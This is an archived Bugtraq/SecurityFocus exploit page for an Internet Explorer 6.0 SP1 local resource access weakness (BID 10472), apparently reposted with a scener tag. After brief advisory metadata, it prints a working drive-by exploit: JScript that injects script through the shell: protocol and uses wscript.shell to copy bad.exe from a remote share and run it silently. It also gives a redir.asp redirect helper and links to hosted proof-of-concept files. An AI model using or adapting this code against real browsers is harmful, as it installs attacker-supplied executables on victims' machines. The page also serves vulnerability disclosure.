#SpeeDr00t@Black Falcon<br>#bid10472<p><b><span style="font-size: 18pt;">Microsoft Internet Explorer URL Local Resource Access Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10472/info">info</a><br><a href="http://www.securityfocus.com/bid/10472/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10472/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10472/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10472/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				10472
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Access Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jun 06 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jun 06 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				The discoverer of this issue is currently unknown.  Rafel Ivgi, The-Insider and Jelmer provided a public analysis of the issue.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Internet Explorer  6.0 SP1<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following proof-of-concept was provided:<br/><br/>URL:ms-its:C:\WINDOWS\Help\iexplore.chm::/iegetsrt.htm<br/><br/>There are reported of exploits circulating in the wild that use this and BID 10473.<br/><br/>A proof-of-concept has been published at the following location:<br/><br/>http://62.131.86.111/security/idiots/repro/installer.htm<br/><br/>An additional proof of concept exploit supplied by, Ferruh Mavituna, that is reported to bypass vendor fixes is available:<br/>New shellscript.js<br/>=====================================================<br/>function injectIt() {<br/><br/>document.frames0.document.body.insertAdjacentHTML('afterBegin','injected&lt;s<br/>cript language="JScript" DEFER&gt; var<br/>rF="\\\\\\\\IPADDRESS\\\\NULLSHAREDFOLDER\\\\bad.exe"; var<br/>wF="%windir%\\\\_tmp.exe"; var o=new ActiveXObject("wscript.shell"); var<br/>e="%comspec% /c copy "+rF+" "+wF; var<br/>err=o.Run(e,0,true);if(err==0)o.Run(wF,0,false);&lt;/script&gt;');<br/>}<br/>document.write('&lt;iframe src="shell:WINDOWS\\Web\\TIP.HTM"&gt;&lt;/iframe&gt;');<br/>setTimeout("injectIt()", 1000);<br/>=====================================================<br/><br/>Also for testing in IIS Servers; ASP equivalent of redir.jsp<br/><br/>redir.asp<br/>=====================================================<br/>&lt;%<br/>Response.Expires = 1<br/>Response.Expiresabsolute = Now() - 1<br/>Response.AddHeader "pragma","no-cache"<br/>Response.AddHeader "cache-control","private"<br/>Response.CacheControl = "no-cache"<br/>For x = 1 to 500000 'Time<br/>   z = z + 10<br/>Next<br/><br/>Response.Status = "302 Found"<br/>Response.AddHeader "Content-Length", "4"<br/>Response.AddHeader "Location","URL:res://shdoclc.dll/HTTP_501.htm"<br/>%&gt;<br/>=====================================================<br/>These files are available at: <br/>http://ferruh.mavituna.com/exploits/fm_ieshell.zip
	
		<ul>
</ul>
</div>